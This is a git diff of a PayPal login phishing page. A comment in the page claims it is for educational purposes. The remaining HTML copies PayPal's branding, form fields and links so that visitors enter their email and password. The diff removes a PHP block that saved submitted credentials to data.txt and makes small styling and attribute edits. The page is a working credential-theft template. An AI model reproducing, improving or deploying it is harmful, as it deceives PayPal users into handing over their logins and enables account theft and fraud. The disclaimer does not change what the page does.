@@ -1,8 +1,8 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 
 <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
 <!--Author: @new92-->
-<!--This page has been made only for educational purposes !! The author is not responsible for any illegal activities carried out using this page-->
+<!--This page has been created only for educational purposes !! The author is not responsible for any illegal actions carried out using this page-->
 <head>
     <meta charset="utf-8" />
     <title>Log in to your PayPal account</title>
@@ -25,7 +25,7 @@
         height: 650px;
         width: 470px;
         font-size: 12px;
-        margin-top: 20px;
+        margin-top: 120px;
     }
 
     .email {
@@ -200,7 +200,7 @@
     <label for="email"></label>
     <input class="email" type="email" name="email" placeholder="  Email or mobile number" required="required" />
     <label for="password"></label>
-    <input class="password" type="password" name="password" placeholder="  Enter your password" required="required "/>
+    <input class="password" type="password" name="password" placeholder="  Enter your password" />
     <br />
     <a href="forbidden.html" class="forpass">Forgot password?</a>
     <br />
@@ -231,17 +231,5 @@
         <a href="https://www.paypal.com/webapps/mpp/country-worldwide" target="_blank" class="worldwide">Worldwide</a>
     </center>
 </div>
-    <?php 
-if(isset($_POST['Sign In'])){
-$email = "Email: ".$_POST['email']."
-";
-$password = "Password: ".$_POST['password']."
-";
-$file=fopen("data.txt","a");
-fwrite($file, $email);
-fwrite($file, $password);
-fclose($file);
-}
-?>
 </body>
 </html>
